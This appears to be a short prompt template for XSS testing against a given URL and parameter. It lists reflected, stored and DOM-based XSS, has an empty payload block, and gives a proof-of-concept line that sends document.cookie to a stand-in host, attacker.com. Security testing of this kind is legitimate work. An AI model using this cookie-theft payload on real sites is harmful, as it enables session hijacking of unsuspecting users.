name: XSS Testing
content: Test XSS vulnerabilities at {url} in parameter {parameter}. Types to test : 1. Reflected XSS 2. Stored XSS 3. DOM-based XSS Basic payloads : ```html ``` For a concrete proof of concept : ```javascript fetch('https://attacker.com/steal?c='+document.cookie) ``` Analyze the injection context (HTML, attribute, JavaScript) and adapt the payload.
